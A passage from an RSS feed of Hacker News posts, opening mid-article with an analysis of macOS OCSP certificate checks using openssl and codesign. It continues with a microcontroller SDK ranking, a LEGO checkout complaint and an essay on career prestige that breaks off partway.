</code></pre></div><p>I should also add that after closing Firefox and opening it again, no requests were made. This is reasonable, and indicates that certificate checking isn’t performed at each launch but only after it hasn’t been performed for a certain period of time.</p>
<p>The request is a very simple GET that contains the payload as a base64-encoded string. The actual binary data can be easily dumped to a file:</p>
<div><pre><code data-lang="bash"><span>echo</span> <span>'ME4wTKADAgEAMEUwQzBBMAkGBSsOAwIaBQAEFDOB0e/baLCFIU0u76+MSmlkPCpsBBRXF+2iz9x8mKEQ4Py+hy0s8uMXVAIIBseUIWx6qTA='</span> <span>|</span> base64 --decode &gt; output.bin
</code></pre></div><p>We obtain an 80-byte-long payload that looks nothing like a hash. Sure enough, it isn’t. We can use OpenSSL to extract readable information from the binary file.</p>
<div><pre><code data-lang="bash">openssl ocsp -text -reqin output.bin
</code></pre></div><pre><code>OCSP Request Data:
    Version: 1 (0x0)
    Requestor List:
        Certificate ID:
          Hash Algorithm: sha1
          Issuer Name Hash: 3381D1EFDB68B085214D2EEFAF8C4A69643C2A6C
          Issuer Key Hash: 5717EDA2CFDC7C98A110E0FCBE872D2CF2E31754
          Serial Number: 06C794216C7AA930
</code></pre><p>It is clear that the <code>trustd</code> service on macOS doesn’t send out a hash of the apps you launch. Instead, it just sends information about some certificate - as we would certainly expect after understanding what OCSP is in the first place.</p>
<p>Well, this does not solve the problem, does it? If each app has a unique certificate, then it would still be possible to create a table that associates each serial number to the corresponding app, and thus this would still be a privacy concern. Let’s check if this is the case.</p>
<h2 id="developer-certificates">Developer certificates…</h2>
<p>First of all I would like to determine from which certificate this information comes from. I used Apple’s <code>codesign</code> utility to extract certificates from the Firefox app in order to look for matching data.</p>
<div><pre><code data-lang="bash">codesign -d --extract-certificates /Applications/Firefox.app
</code></pre></div><p>This command results in several files being created with names <code>codesign0</code>, <code>codesign1</code>, etc. The first one is the leaf certificate, while others belong to the certificate chain up until the root. <code>codesign0</code> should be what we are looking for, and once again we can use OpenSSL to extract some info about it.</p>
<div><pre><code data-lang="bash">openssl x509 -inform der -in codesign0 -text
</code></pre></div><pre><code>Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 488521955867797808 (0x6c794216c7aa930)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Developer ID Certification Authority, OU=Apple Certification Authority, O=Apple Inc., C=US
        Validity
            Not Before: May  8 19:08:58 2017 GMT
            Not After : May  9 19:08:58 2022 GMT
        Subject: UID=43AQ936H96, CN=Developer ID Application: Mozilla Corporation (43AQ936H96), OU=43AQ936H96, O=Mozilla Corporation, C=US
        ...
</code></pre><p>Check the serial number we got (<code>0x6c794216c7aa930</code>) and compare it with the payload of the OCSP request. We have a match! This proves that OCSP requests actually send out information about the app developer certificate.</p>
<h2 id="and-their-generality">…and their generality</h2>
<p>“So what?” you might ask. Well, developer certificates aren’t unique for each app. Once again, don’t take my word for it. We can quickly verify this by checking the certificate of a different app from Mozilla, say Thunderbird.</p>
<div><pre><code data-lang="bash">codesign -d --extract-certificates /Applications/Thunderbird.app
openssl x509 -inform der -in codesign0 -text
</code></pre></div><pre><code>Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 488521955867797808 (0x6c794216c7aa930)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Developer ID Certification Authority, OU=Apple Certification Authority, O=Apple Inc., C=US
        Validity
            Not Before: May  8 19:08:58 2017 GMT
            Not After : May  9 19:08:58 2022 GMT
        Subject: UID=43AQ936H96, CN=Developer ID Application: Mozilla Corporation (43AQ936H96), OU=43AQ936H96, O=Mozilla Corporation, C=US
        ...
</code></pre><p>That’s exactly the same certificate used for Firefox (of course it is!). So Jeffrey Paul’s analysis isn’t quite accurate - at least for what concerns these parts (emphasis mine).</p>
<blockquote>
<p>The OS sends to Apple a hash (unique identifier) of each and every program you run, when you run it.</p>
</blockquote>
<blockquote>
<p>[An IP address]&nbsp;allows for a table that has the following headings:
Date, Time, Computer, ISP, City, State, <strong>Application Hash</strong></p>
</blockquote>
<blockquote>
<p>[This means that Apple knows] what apps you open there, and how often. They know when you open Premiere over at a friend’s house on their Wi-Fi, and they know when you open Tor Browser in a hotel on a trip to another city.</p>
</blockquote>
<p>macOS does actually send out some opaque information about <strong>the developer</strong> certificate of those apps, and that’s quite an important difference on a privacy perspective.</p>
<h2 id="a-word-about-notarization">A word about notarization</h2>
<p>I would like to clarify something that is probably at the root of this misunderstanding. In fact, there exists a situation where macOS can actually send Apple the hash of an executable, and that is when <strong>Gatekeeper</strong> checks if a notarization ticket exists on Apple’s servers upon first launch, in case the ticket isn’t stapled to the app<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.</p>
<p>This has nothing to do with OCSP. It happens under specific circumstances and the check is performed via a secure (HTTPS) endpoint located at <code>api.apple-cloudkit.com</code>. During this process, a pop-up with a progress bar is shown to the user.</p>
<h2 id="about-blocking-ocsp">About blocking OCSP</h2>
<p>As you probably have already learned during Apple’s OCSP responder outage, you can block OCSP requests in several ways, the most popular ones being Little Snitch<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> and editing your <code>/etc/hosts</code> file. Personally, I wouldn’t suggest doing that as it prevents an <strong>important security feature</strong> from working.</p>
<p>Now that you know the actual facts, if you think your privacy is put at risk by this feature more than having potential undetected malware running on your system, go ahead. Otherwise, don’t bother.</p>
<p>If you use macOS Big Sur, blocking OCSP might not be as trivial. Before crying conspiracy, however, keep in mind that common users are generally not able to fully understand and evaluate the impact of disabling such a complex and delicate security feature on their computer.</p>
<h2 id="tldr">TL;DR</h2>
<ul>
<li>No, macOS <strong>does not</strong> send Apple a hash of your apps each time you run them.</li>
<li>You should be aware that macOS <strong>might transmit</strong> some opaque information about the developer certificate of the apps you run. This information is sent out in clear text on your network.</li>
<li><strong>You shouldn’t</strong> probably block <code>ocsp.apple.com</code> with Little Snitch or in your hosts file.</li>
</ul>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol">https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">https://sneak.berlin/20201112/…</a></p></li></ol></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jacopo.io/en/post/apple-ocsp/">https://blog.jacopo.io/en/post/apple-ocsp/</a></em></p>]]>
            </description>
            <link>https://blog.jacopo.io/en/post/apple-ocsp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25095438</guid>
            <pubDate>Sat, 14 Nov 2020 20:39:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Best and Worst Microcontroller SDKs]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25094956">thread link</a>) | @ducktective
<br/>
November 14, 2020 | https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks | <a href="https://web.archive.org/web/*/https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>In 2020, an MCU is much more than a hunk of silicon. Indeed, it comes with a
whole ecosystem including a BSP, integrated third-party libraries, tooling,
field application support,  and more.</p>

<p>As firmware engineers, we are often handed down an MCU selection as a fait
accompli. Cost concerns, peripheral, or pinout requirements often take precedent
over the SDK.</p>

<p>Yet we are allowed to have an opinion. So here for you today is my first post in
a new “comparing MCU SDKs” series.</p>

<!-- excerpt start -->

<p>In this post, I download SDKs for 10 popular Cortex-M4 microcontrollers, and
evaluate how straightforward it is to get a simple example compiling. I include
some step by step instructions to get started, a rating out of 10, and a few
comments.</p>

<!-- excerpt end -->

<p>It goes without saying that this is an opinion based on my own very specific
setup (MacOS, vim). Your mileage may vary!</p>

<p>Like Interrupt? <a href="https://go.memfault.com/interrupt-subscribe" target="_blank">Subscribe</a> to get our latest posts straight to your mailbox.</p>



<h2 id="what-im-looking-for-in-a-chip-sdk">What I’m looking for in a chip SDK</h2>

<p>My ideal chip SDK provides a way to build and flash projects using tools of
my choosing. This seems like a low bar, but few meet it. Here are things chip
SDKs should <strong>not</strong> do.</p>

<h3 id="dont-choose-my-laptop-os-for-me">Don’t choose my laptop OS for me!</h3>

<p>I left Windows behind when I worked at Sun Microsystems, and I have not looked
back. Today, my daily driver is a MacBook Air.  Unfortunately, some chip vendors
require that you use their Windows-based tools to set up and build your projects.
Now that most compilers are cross-platform, there is no excuse for it.</p>

<h3 id="dont-choose-my-ide-for-me">Don’t choose my IDE for me!</h3>

<p>I’ve been using <code>vim</code> since college, and you can take it from my cold, dead
hands. I love <code>vim</code>! I have it configured just so. It’s lightweight, it’s fast,
and modal editing is the way to work (prove me wrong!). So you’ll understand my
dismay at the spate of Eclipse-based IDEs chip vendors want to foist upon me. I
want nothing to do with their boated, Java environments.</p>

<p>Instead of Eclipse-based IDE, I suggest SDKs provide Makefiles. <code>make</code> is the
lowest common denominator build system, and is well supported by many tools.
Bonus points for project files for IAR and Keil, since many of you like those
tools.</p>

<h3 id="do-include-some-examples">Do include some examples</h3>

<p>If a picture is worth a thousand words, then a working code example is worth a
million. Give me one example of each of the main use cases for your MCU. Bonus
points if you give me an example for each peripheral.</p>

<h2 id="ten-popular-chip-sdks-ranked">Ten Popular Chip SDKs, Ranked</h2>

<h3 id="nordic-semi-nrf5-sdk---1010">Nordic Semi nRF5-SDK - 10/10</h3>

<p>Nordic semiconductor’s line of Cortex-M4 MCUs includes the nRF52810, nRF52810,
and nRF52840. All feature a 2.4GHz radio, which may deter you if all you want is
an MCU.</p>

<p>The nRF5-SDK (soon to be replaced by the equally excellent nRF-Connect-SDK), is
in my view the best chip SDK out there.</p>

<h4 id="why-the-rating">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ✅</li>
</ul>

<p>The nRF5 SDK does everything right. No registration, no install, no online
configurator. It even is distributed under a BSD license!</p>

<h4 id="compiling-a-blinky-example">Compiling a Blinky example</h4>
<ol>
  <li>Download the nRF5 SDK from <a href="https://www.nordicsemi.com/Software-and-tools/Software/nRF5-SDK/Download#infotabs" target="_blank">nRF5 SDK downloads - nordicsemi.com</a>
</li>
  <li>Unzip the resulting <code>DeviceDownload.zip</code> file</li>
  <li>Unzip the SDK archive contained within. In my case that’s <code>nRF5SDK1702d674dde.zip</code>
</li>
  <li>
<code>cd</code> to the example you are interested in. Examples are contained within the <code>example</code> folder. In my case, <code>examples/peripheral/blinky/pca10040/blank</code>.</li>
  <li>
<code>cd</code> to the build system folder of your choice, in my case <code>armgcc</code>
</li>
  <li>Build the example, in my case by invoking <code>GNU_INSTALL_ROOT= make</code>
</li>
</ol>

<p>This will generate a <code>bin</code>, <code>elf</code>, and <code>hex</code> file (among others) under <code>_build</code>.</p>

<h3 id="texas-instruments-tivaware---910">Texas Instruments TivaWare - 9/10</h3>

<p>The Tiva C series is the latest entry in Texas Instruments’s line of Cortex-M
microcontrollers.  I do not have a lot of experience with them, but they seem
like solid microcontrollers with a broad range of peripherals (including USB).</p>

<h4 id="why-the-rating-1">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ✅</li>
</ul>

<p>Like Nordic, Texas Instruments gets a lot right: single-zip download, multi-IDE
support (including Makefiles), and lots of examples. I knocked off a point for
the wonky <code>exe</code> file (see below) and the more complicated license.</p>

<h4 id="compiling-a-blinky-example-1">Compiling a Blinky example</h4>

<ol>
  <li>Download TiWare SDK from <a href="https://www.ti.com/tool/download/SW-TM4C" target="_blank">SW-TM4C_2.2.0.295, TI.com</a>
</li>
  <li>Rename the downloaded file from <code>exe</code> to <code>zip</code>
</li>
  <li>Unzip it</li>
  <li>
<code>cd</code> to the example you are interested in. In my case <code>examples/boards/dk-tm4c129x/blinky</code>.</li>
  <li>Run <code>make</code>, or open the IDE-specific folder of your choice.</li>
</ol>

<p>You’ll be left with an <code>axf</code> (aka an ELF) and a <code>bin</code>  file in the <code>gcc</code> folder.</p>

<h3 id="nxp-mcuxpresso---910">NXP MCUXpresso - 9/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/E2992448-AC4D-4A31-9B86-E4806F729E51.png" alt=""></p>

<p>NXP Kinetis traces its lineage to Motorola via Freescale. It is one of two
Cortex-M lines from NXP (the other being the LPC).  Like many MCU vendors, NXP
generates their SDK via a configurator and provides an Eclipse-based IDE, both
under the “MCUXpresso” brand.</p>

<h4 id="why-the-rating-2">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ⚠️</li>
</ul>

<p>I found the online MCUXpresso SDK builder a breeze to use. It is snappy,
straightforward, and it keeps track of all your previously configured SDKs.
Great job, NXP! The only downside of the tool is that it requires you to
register on their website.</p>

<p>I still have a preference for the monolithic SDK with all examples and targets
in one place, but you could argue that this generates a smaller, more
streamlined SDK.</p>

<p>Best of all, the SDK uses <code>cmake</code> to generate build files. <code>cmake</code> is arguably
more portable than <code>make</code>, as it is supported natively on Windows.</p>

<h4 id="compiling-a-hello-world-example">Compiling a hello world example</h4>

<ol>
  <li>Go to the MCUXpresso SDK builder and create an account: <a href="https://mcuxpresso.nxp.com/" target="_blank">MCUXpresso SDK Builder</a>
</li>
  <li>Once logged in, click on “Select Board” in the sidebar</li>
  <li>Enter the name of your MCU. In my case, a Kinetic K21</li>
  <li>Click on “Build MCUXpresso SDK” on the right</li>
  <li>Name your project, select a toolchain, and some third party software like FreeRTOS or mbedTLS.</li>
  <li>Click on “Download SDK” at the bottom</li>
  <li>After a bit, the SDK will be ready for download</li>
  <li>Unzip the SDK</li>
  <li>
<code>cd</code> to the example of your choice, in my case <code>boards/twrk21d50m/demo_apps/hello_world/</code>
</li>
  <li>
<code>cd</code> to build system folder, in my case <code>armgcc</code>
</li>
  <li>Use the <code>build_debug.sh</code> build script and specify the<code>ARMGCC_DIR</code> environment variable:
e.g. <code>ARMGCC_DIR=/usr/local/Cellar/arm-none-eabi-gcc/9-2019-q4-major sh build_debug.sh</code>
</li>
</ol>

<p>This will generate an ELF file.</p>

<h3 id="stm32-cube---810">STM32 Cube - 8/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/6DA202F6-ED4E-4FFE-94B7-3A549D0F212F.png" alt=""></p>

<p>ST has gone through multiple iterations of the SDK for the STM32 family of ICs.
The latest is called STM32 Cube, which replaces the venerable Standard
Peripheral Library. While Cube introduces a lot of complexity, it does so for a
good reason: the STM32 family has grown to include 14 distinct series of MCUs
from the very low power L0 to the very high-performance H7.</p>

<blockquote>
  <p>Note: Reader Nathan Jones <a href="https://community.memfault.com/t/the-best-and-worst-mcu-sdks-interrupt/294/12" target="_blank">pointed
out</a>
after the initial publication of this post that monolithic SDK downloads do
still exist for STM32. For example, <a href="https://www.st.com/content/st_com/en/products/embedded-software/mcu-mpu-embedded-software/stm32-embedded-software/stm32cube-mcu-mpu-packages/stm32cubef1.html" target="_blank">here is the SDK for the
STM32F1</a></p>
</blockquote>

<h4 id="why-the-rating-3">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ❌</li>
</ul>

<p>While Cube comes with support for many IDEs, and more examples than any other
MCU SDK, it wraps it all in a clunky desktop app. I had a terrible time using
STM32CubeMX: I had to install it on my laptop, it’s slow, it’s large, it’s
clunky. I do not like it.</p>

<p>STM32CubeMX generates a “project” directory based on your configuration. This
means that you won’t have all the example code in one folder, and instead will
need to generate different projects for different examples.</p>

<p>Necessary complexity? Perhaps. But I miss the simpler Peripheral Library which
came as a single archive.</p>

<h4 id="compiling-a-hello-world-example-1">Compiling a Hello World example</h4>

<ol>
  <li>
    <p>Download and install CubeMX: <a href="https://www.st.com/en/development-tools/stm32cubemx.html" target="_blank">STM32CubeMX - STM32Cube initialization code generator - STMicroelectronics</a>. Note: this requires registration on ST’s website</p>
  </li>
  <li>Select “ACCESS TO MCU SELECTOR”</li>
  <li>Select the part you are using. In my case “STM32F429IE”</li>
  <li>In the Configuration view, click on the “Project Manager” tab</li>
  <li>Enter a project name, a path, and select a toolchain. In my case “Makefile”</li>
  <li>Click on “Generate Code” at the top right</li>
  <li>
<code>cd</code> to the generated project directory</li>
  <li>Compile the project with your build system. In my case with <code>make</code>.</li>
</ol>

<h3 id="atmel-start-for-samd---710">Atmel START for SAMD - 7/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/83E37D9A-5975-4815-8937-437DA8675C0D.png" alt=""></p>

<p>Recently acquired by Microchip, Atmel has been making SAM-family MCUs for a long
time. The SAMD21 is well-liked in hobbyist circles and is featured in several
Arduino and Adafruit designs. Atmel’s peripheral library, AXF, went through a
similar transformation to ST’s: it went from a single zip archive to a
configurator.</p>

<h4 id="why-the-rating-4">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ❌</li>
</ul>

<p>Atmel’s configurator is web-based, and a tad more ergonomic than ST’s. However,
the resulting Makefiles are much worse and even feature a bug (I had to fix OS
detection).</p>

<h4 id="compiling-a-hello-world-example-2">Compiling a hello world example</h4>

<ol>
  <li>Go to start.atmel.com</li>
  <li>Click on “Create New Project”</li>
  <li>Select your MCU. In my case a SAMD51 Chip.</li>
  <li>Click on “Export Project” at the top right</li>
  <li>Give it a name, and tick the check-box for your IDE (for me: Makefile)</li>
  <li>Click on “Download Pack”</li>
  <li>Rename resulting file from <code>.azip</code> to <code>.zip</code>
</li>
  <li>Extract it</li>
  <li>
<code>cd</code> to into IDE folder, in my case <code>gcc</code>
</li>
  <li>Fix Makefile OS detection:
    <div>
<div><pre><code><span>@@ -22,7 +22,7 @@</span> else
                MK_DIR = mkdir -p
        endif
    
<span>+       ifeq ($(shell uname | cut -d _ -f 1), Darwin)
</span><span>-       ifeq ($(shell uname | cut -d _ -f 1), DARWIN)
</span>                MK_DIR = mkdir -p
        endif
 endif
</code></pre></div>    </div>
  </li>
  <li>Run <code>make</code>
</li>
</ol>

<h3 id="silabs-simplicity-studio---510">Silabs Simplicity Studio - 5/10</h3>

<p><img src="https://interrupt.memfault.com/blog/img/best-and-worst-mcu-sdks/3F4AD307-656B-4664-B988-4F5A301BD771.png" alt=""></p>

<p>Silabs Cortex-M MCU comes from its acquisition of Energy Micro who was famous for
the very low power consumption of their MCUs. Silabs now makes a range of
Cortex-M based MCUs, some with 2.4GHz radios.</p>

<p>Like many of the vendors in the lower half of this list, Silabs distributes
its SDK alongside an Eclipse-based IDE. In their case, they call it “Simplicity
Studio”. While Simplicity is the best of those IDEs, it does leave those of us
who do not love Eclipse with few solutions. Here, I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks">https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks</a></em></p>]]>
            </description>
            <link>https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25094956</guid>
            <pubDate>Sat, 14 Nov 2020 19:35:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't make customers think about whether they should pay you]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25093628">thread link</a>) | @krewast
<br/>
November 14, 2020 | https://www.krewast.de/artikel/dont-make-customers-think-about-whether-they-should-pay-you/ | <a href="https://web.archive.org/web/*/https://www.krewast.de/artikel/dont-make-customers-think-about-whether-they-should-pay-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><h2 id="because-they-probably-wont">…because they probably won’t</h2><p>I recently watched a few videos on YouTube about the latest and greatest LEGO sets. I didn’t do it because I’m super interested in LEGO (that was a while ago) but because the YouTube algorithm decided that I had to. I naturally obeyed. The results were as expected: I felt old and none of those sets triggered any kind of “I need to have this” response. Until I saw this:</p><p><img src="https://www.krewast.de/img/artikel-lego-tree-house.jpg" alt="Lego Tree House"></p><p>This beautiful tree house immediately sparked my interest. It’s cute, it’s not one of those boring license sets (Star Wars, Harry Potter, Minecraft, …), the price to number of LEGO pieces ratio is okay (still super expensive!) and it would fit nicely between my house plants which I foster - and sometimes kill - in my living room.</p><p>So, I did something I usually never do: I made an impulse buy. I put the 195&nbsp;€ tree house into the shopping cart, created a LEGO user account, entered all my data, chose “Invoice” as payment method and clicked “Buy”. I received the automatic “Thank you for your purchase” e-mail and felt happy.</p><h2 id="we-are-sorry">We are sorry</h2><p>On the next day I received another e-mail. This time from the LEGO customer service. You can find the original German version at the end of this post, here is a short translation of the important part:</p><blockquote>Dear Bastian Kres,<p>thank you for ordering your LEGO® toy directly from us.</p><p>Unfortunately, the total amount of your order exceeds the credit limit for payment on account and by direct debit. Therefore, we are not able to send this order yet.</p><p>Please call us to pay by VISA or MasterCard. […]</p></blockquote><p>Well, here’s the thing: LEGO knew that I was a first time customer and they also knew that the total amount of my order was about 195 €. If they didn’t want me to pay on account, why did they offer me the option?</p><h2 id="how-to-kill-enthusiasm">How to kill enthusiasm</h2><p>1.) I would like to mention that wouldn’t have had a problem to pay in advance. PayPal or credit card are good options which I use all the time. But by sending me this e-mail after I already selected my preferred payment method and ordered the thing, LEGO basically tells me that I cannot be trusted. And at the same time they want me to trust them…</p><p>2.) As I wrote before, this purchase was an impulse buy. The tree house is something I wanted. But after receiving this e-mail I had lot of time to think about whether or not I still do? Especially because I could buy a huge amount of real plants for 195&nbsp;€. That would be good for nature, but bad for LEGO.</p><p>3.) By postponing the delivery until after I paid, they also created a whole new experience for me. Now I don’t have the tree house in my hands, see how nice it is and pay happily. No, now I have this bitter taste in my mouth and a decision to make. Should I really be making decisions after I already ordered something?</p><h2 id="some-lessons-for-online-stores">Some lessons for online stores</h2><p>As a web developer I always find it interesting to see how even very big companies still make mistakes like this. But the good thing is: We can learn from them!</p><ul><li>Make it easy for customers to order from you, avoid any friction or inconveniences</li><li>Offer customers a broad set of payment options, omit those you deem too risky</li><li>Don’t send customers “We don’t trust you” messages after they already ordered something from you. It totally kills their enthusiasm</li></ul><p>And that’s it.</p><p>One last question remains: Did LEGO dodge a bullet because I would have sent the tree house back anyway? Maybe, but probably not. I rarely send anything back for two reasons: It’s an effort and I’m generally lazy ;)</p><p>If any of this sound snarky: I’m sorry, that was never my intention. I just found it interesting (and wanted to share) how LEGO decided to set up this process, what consequences it can have and how I probably won’t get a new toy but at least ten new house plants.</p><hr><p>Obligatory link to <a href="https://www.youtube.com/channel/UC_EZd3lsmxudu3IQzpTzOgw" target="_blank" rel="nofollow noopener">Held der Steine</a> and his <a href="https://www.youtube.com/watch?v=nIQJV2o6EPY" target="_blank" rel="nofollow noopener">LEGO Tree House</a> video.</p><h2 id="the-original-german-e-mail">The original German e-mail</h2><blockquote>Guten Tag Bastian Kres,<p>vielen Dank, dass Sie Ihr LEGO® Spielzeug direkt bei uns bestellt haben.</p><p>Leider überschreitet die Gesamtsumme Ihrer Bestellung die Kreditgrenze für Zahlung auf Rechnung und per Lastschriftverfahren. Daher können wir diese Bestellung leider noch nicht abschicken.</p><p>Bitte rufen Sie uns an, um per VISA oder MasterCard zu bezahlen. Sie erreichen uns von Montag bis Freitag von 9 bis 21 Uhr aus dem Festnetz gebührenfrei unter 00800 5346 1111. Aus Sicherheitsgründen sollten Sie Ihre Kreditkartendaten nie per E-Mail oder Brief weitergeben.</p><p>Oder Sie zahlen den Betrag im Voraus auf unser Konto ein:</p><p>[…]</p><p>Sobald wir Ihre Zahlung verbucht haben, geben wir Ihre Bestellung automatisch zum Versand frei.</p><p>Wir möchten Sie um Verständnis für diese Maßnahme bitten und hoffen, Ihnen damit nicht zu viele Umstände bereitet zu haben.</p><p>Bitte melden Sie sich gerne auch mit Rückfragen zu Ihrer Bestellung unter der oben angegebenen Nummer.</p><p>Herzliche Grüße,</p><p>Ihr LEGO Kundenservice</p></blockquote><div id="call-to-action-kontakt"><hr><p>Fragen, Wünsche, Anregungen? Webentwickler aus Regensburg gesucht? Schreiben Sie mir einfach!</p><p><a href="https://www.krewast.de/#kontakt">Kontakt</a></p></div></div></div></div></section></div>]]>
            </description>
            <link>https://www.krewast.de/artikel/dont-make-customers-think-about-whether-they-should-pay-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25093628</guid>
            <pubDate>Sat, 14 Nov 2020 17:08:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prestige Trap: finance, big tech, and consulting]]>
            </title>
            <description>
<![CDATA[
Score 252 | Comments 257 (<a href="https://news.ycombinator.com/item?id=25093349">thread link</a>) | @wdesilvestro
<br/>
November 14, 2020 | https://wesdesilvestro.com/the-prestige-trap | <a href="https://web.archive.org/web/*/https://wesdesilvestro.com/the-prestige-trap">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>For the past year, I've been on a leave of absence from college working on a startup. As I prepare for my return to school, what comes next has been on my mind.</p><p>Leaving college made me realize there are more career options than ever seemed available to me as a student. I would have expected that taking time off would have had the opposite effect—bringing me up to speed on the areas that interest me and those I should steer clear of. Naturally, the list of options should have winnowed after stepping outside of the college bubble. On the contrary, I find myself with dozens of ideas of things to work on, far more than what seemed possible in college.</p><p>College made it seem like there were just a few worthwhile career tracks. When I chose to take time off, I left in the middle of my junior year during the peak of on-campus recruiting, the process by which Harvard students compete for internships at a narrow list of companies. I say "narrow" to emphasize the fact that just three industries captured the attention of my peers: <strong>finance, big tech, and consulting (FTC)</strong>. When you subtract out the students attending grad school or who don't immediately enter the workforce, nearly half choose one of these fields.<sup id="fnref-1"><a href="#fn-1">1</a></sup> Why?</p><h3>Why FTC?</h3><p>The simplest explanation is money. Students want high-paying jobs and these are industries that pay higher on average. But it's naive to chalk all of this up to economics—there are many instances when students are offered an equally competitive job in terms of salary and still opt for FTC. I recall many different industries, such as consumer packaged goods companies, recruiting and offering salaries similar to entry-level management consulting—but they were seldom the talk of campus.</p><p>Neither is it interest. The average Harvard student would probably prefer to work on Google Maps over Kraft Mac &amp; Cheese, but this doesn't explain why students have such narrow interests <em>within</em> FTC. Why are Google and Facebook so attractive to prospective engineers while Stripe and Nvidia are never brought up? Or why do aspiring consultants obsess over McKinsey, Bain, and BCG to the exclusion of more boutique firms with similar compensation structures?<sup id="fnref-2"><a href="#fn-2">2</a></sup> Holding interest constant, students' decisions are still clustered around a few companies.</p><p>When discussing management consulting, many students talked about how they liked the "optionality" that the industry offered. In short, they viewed it as a few more years of college without the pressure to choose a particular career path. I think people felt similarly about finance and big tech—they didn't narrow your career trajectory in the same way a more niche company might have. But again, this doesn't explain why within FTC, students are still so fixated on a few specific companies.</p><p>When I asked my peers why they preferred these particular firms, they often answered that they were better than the rest of the industry. But by which logic are they better? When asked about the specifics, they'd often give vague non-answers that seemed almost scripted. "I like Bain because I feel like I have a good fit with the firm". Or, "Goldman is attractive to me because it has a culture of excellence." These answers were unsatisfying because it was clear they were ad hoc rationalizations. Thankfully, one student was once blunt enough to confirm what everyone already knew: "I want Google on my resume because it is prestigious." For most, these firms were top of mind because they were prestigious, not because they resonated particularly well with the individual applicant.</p><p>For students unsure of what career to pursue, prestige is often the driving metric in job selection. For many, prestige is useful in that it guarantees one is respected and admired for the job they ultimately choose. This explains the ad hoc rationalizations from before and why students often expressed interest in FTC before they even fully understood what their work would entail. it's like a kindergartener saying "doctor" when adults ask them what they want to be when they grow up. Their answer says more about the desires of the group than themselves.<sup id="fnref-3"><a href="#fn-3">3</a></sup></p><h3>What is Prestige?</h3><p>Prestige is a measure of how much status a group assigns to something. From this definition, a lot of interesting qualities of prestige can be discerned.</p><p>Since prestige depends upon what the <em>group</em> thinks, then it follows that it is not a fixed nor immutable quality. Groups of people differ everywhere, so what is prestigious in one place is not necessarily prestigious in another.</p><p>For example, many college students would love to work for a Silicon Valley startup—but I know of few Harvard students who prefer startups over big tech. Again, this isn't an economic decision—recruits of later-stage startups can command the same or even better compensation than FAANG in some cases—but I've never heard of a Harvard CS major wanting to work for Stripe.<sup id="fnref-4"><a href="#fn-4">4</a></sup> This is surprising since Stripe is prestigious <em>within</em> the Valley itself. Prestige's dependence on the group makes it a localized phenomenon.</p><p>Prestige also changes over time. What we considered prestigious a hundred years ago is very different from what we do today because social status has changed a lot. Understanding the evolution of social status is worthy of a whole separate essay (or perhaps a book). However, I suspect that prestige is closely linked to our economy and thus downstream of culture, policy, and most of all, technology. This would explain why it's more prestigious to start a startup today than it was a hundred years ago—one can simply become a lot richer than they could before.</p><h3>The Roots of Prestige</h3><p>So if prestige depends upon what people find to be high status, then where does it originate in the first place? That is, how does a group come to deem something prestigious initially? The best <a href="http://www.paulgraham.com/love.html">explanation</a> for prestige I've seen thus far comes from Paul Graham:</p><blockquote><p>"Prestige is just fossilized inspiration. If you do anything well enough, you'll <em>make</em> it prestigious. Plenty of things we now consider prestigious were anything but at first. Jazz comes to mind—though almost any established art form would do. So just do what you like, and let prestige take care of itself."</p></blockquote><p>Groups assign status to the things which accurately signal the values and aspirations of that group. For elite college students, FTC 